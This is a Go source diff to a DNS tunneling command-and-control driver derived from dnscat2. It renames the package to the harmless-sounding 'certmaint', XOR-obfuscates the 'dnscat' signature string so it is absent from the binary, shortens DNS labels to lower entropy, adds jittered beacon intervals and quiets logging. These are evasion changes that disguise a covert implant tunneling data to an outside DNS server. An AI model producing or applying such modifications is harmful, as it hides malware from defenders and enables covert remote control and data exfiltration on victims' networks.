@@ -11,14 +11,28 @@ import (
 	"strings"
 	"time"
 
-	"dnscat2/pkg/controller"
+	"certmaint/pkg/controller"
+	"certmaint/pkg/dlog"
 )
 
 const (
-	MaxFieldLength = 62
+	MaxFieldLength = 62  // DNS RFC max label length
+	MaxLabelLength = 20  // operational cap per label (entropy reduction)
 	MaxDNSLength   = 255
-	WildcardPrefix = "dnscat"
 )
+
+// WildcardPrefix is "dnscat" decoded at runtime — raw string absent from binary.
+// Encoded with key(i) = (0xA3 + i*0x5B) & 0xFF (same formula as CWLHerpaderping/EfsPotato).
+var WildcardPrefix string
+
+func init() {
+	enc := []byte{0xC7, 0x90, 0x2A, 0xD7, 0x6E, 0x1E}
+	b := make([]byte, len(enc))
+	for i, c := range enc {
+		b[i] = c ^ byte((0xA3+i*0x5B)&0xFF)
+	}
+	WildcardPrefix = string(b)
+}
 
 // DNSType represents DNS record types
 type DNSType uint16
@@ -38,6 +52,7 @@ type Driver struct {
 	DNSPort   uint16
 	Types     []DNSType
 	conn      *net.UDPConn
+	nextSend  time.Time
 }
 
 // NewDriver creates a new DNS tunnel driver
@@ -94,7 +109,7 @@ func (d *Driver) MaxDNSCatLength() int {
 	if d.Domain == "" {
 		domainLen = len(WildcardPrefix)
 	}
-	return (MaxDNSLength / 2) - domainLen - 1 - ((MaxDNSLength / MaxFieldLength) + 1)
+	return (MaxDNSLength / 2) - domainLen - 1 - ((MaxDNSLength / MaxLabelLength) + 1)
 }
 
 // getType returns a random DNS type to use
@@ -120,7 +135,7 @@ func (d *Driver) encodeDNSName(data []byte) string {
 		sectionLen++
 
 		// Add period if needed
-		if i+1 != len(encoded) && sectionLen+1 >= MaxFieldLength {
+		if i+1 != len(encoded) && sectionLen+1 >= MaxLabelLength {
 			result.WriteByte('.')
 			sectionLen = 0
 		}
@@ -235,16 +250,28 @@ func (d *Driver) decodeHex(data []byte) ([]byte, error) {
 	return hex.DecodeString(clean)
 }
 
-// doSend sends outgoing data
-func (d *Driver) doSend() {
+// scheduleNext sets the next beacon time with jitter.
+// sent=true (active): 1000+rand(0..2000) ms; sent=false (idle): 5+rand(0..25) s.
+func (d *Driver) scheduleNext(sent bool) {
+	var jitter time.Duration
+	if sent {
+		jitter = time.Duration(1000+rand.Intn(2000)) * time.Millisecond
+	} else {
+		jitter = time.Duration(5+rand.Intn(25)) * time.Second
+	}
+	d.nextSend = time.Now().Add(jitter)
+}
+
+// doSend sends outgoing data; returns true if a packet was written to the wire.
+func (d *Driver) doSend() bool {
 	data, hasActiveSessions := controller.GetOutgoing(d.MaxDNSCatLength())
 	if !hasActiveSessions {
-		fmt.Println("There are no active sessions left! Goodbye!")
+		dlog.Println("No active sessions.")
 		os.Exit(0)
 	}
 
 	if data == nil || len(data) == 0 {
-		return
+		return false
 	}
 
 	name := d.encodeDNSName(data)
@@ -255,85 +282,89 @@ func (d *Driver) doSend() {
 	addr := fmt.Sprintf("%s:%d", d.DNSServer, d.DNSPort)
 	raddr, err := net.ResolveUDPAddr("udp", addr)
 	if err != nil {
-		fmt.Printf("DNS: failed to resolve %s: %v\n", addr, err)
-		return
+		dlog.Printf("DNS: failed to resolve %s: %v\n", addr, err)
+		return false
 	}
 
 	_, err = d.conn.WriteToUDP(query, raddr)
 	if err != nil {
-		fmt.Printf("DNS: send error: %v\n", err)
+		dlog.Printf("DNS: send error: %v\n", err)
+		return false
 	}
+	return true
 }
 
 // Run starts the DNS driver main loop
 func (d *Driver) Run() {
-	// Initial send
-	d.doSend()
+	// Initial send immediately
+	sent := d.doSend()
+	d.scheduleNext(sent)
 
-	// Set up receive buffer
 	buf := make([]byte, 4096)
 
 	for {
-		// Set timeout for receiving
 		d.conn.SetReadDeadline(time.Now().Add(50 * time.Millisecond))
 
 		n, _, err := d.conn.ReadFromUDP(buf)
 		if err != nil {
 			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
-				// Timeout - send next packet and continue
 				controller.Heartbeat()
-				d.doSend()
+				// Beacon send: gated by jitter schedule
+				if time.Now().After(d.nextSend) {
+					hasData := controller.HasPendingData()
+					sent := d.doSend()
+					// active = real app data queued; idle = keep-alive only → long interval
+					d.scheduleNext(sent && hasData)
+				}
 				continue
 			}
-			fmt.Printf("DNS: receive error: %v\n", err)
+			dlog.Printf("DNS: receive error: %v\n", err)
 			continue
 		}
 
-		// Parse DNS response
 		response, err := ParseDNSResponse(buf[:n])
 		if err != nil {
-			fmt.Printf("DNS: parse error: %v\n", err)
+			dlog.Printf("DNS: parse error: %v\n", err)
 			continue
 		}
 
-		// Check for errors
 		if response.RCode != 0 {
 			switch response.RCode {
 			case 1:
-				fmt.Println("DNS: RCODE_FORMAT_ERROR")
+				dlog.Println("DNS: RCODE_FORMAT_ERROR")
 			case 2:
-				fmt.Println("DNS: RCODE_SERVER_FAILURE")
+				dlog.Println("DNS: RCODE_SERVER_FAILURE")
 			case 3:
-				fmt.Println("DNS: RCODE_NAME_ERROR")
+				dlog.Println("DNS: RCODE_NAME_ERROR")
 			case 4:
-				fmt.Println("DNS: RCODE_NOT_IMPLEMENTED")
+				dlog.Println("DNS: RCODE_NOT_IMPLEMENTED")
 			case 5:
-				fmt.Println("DNS: RCODE_REFUSED")
+				dlog.Println("DNS: RCODE_REFUSED")
 			default:
-				fmt.Printf("DNS: Unknown error code (0x%04x)\n", response.RCode)
+				dlog.Printf("DNS: error code 0x%04x\n", response.RCode)
 			}
 			continue
 		}
 
 		if len(response.Answers) == 0 {
-			fmt.Println("DNS didn't return an answer")
+			dlog.Println("DNS: no answer")
 			continue
 		}
 
-		// Decode response
 		data, err := d.decodeDNSResponse(response)
 		if err != nil {
-			// Only log if debug is enabled
 			continue
 		}
 
+		// Response-triggered sends bypass the jitter gate for low-latency data exchange
 		if len(data) > 0 {
 			if controller.DataIncoming(data) {
-				d.doSend()
+				sent := d.doSend()
+				d.scheduleNext(sent)
 			}
 		} else {
-			// Empty response from server (just ACK, no data) - still call doSend for retransmit
-			d.doSend()
+			sent := d.doSend()
+			d.scheduleNext(sent)
 		}
 	}
 }
@@ -344,4 +375,3 @@ func (d *Driver) Close() {
 		d.conn.Close()
 	}
 }
-
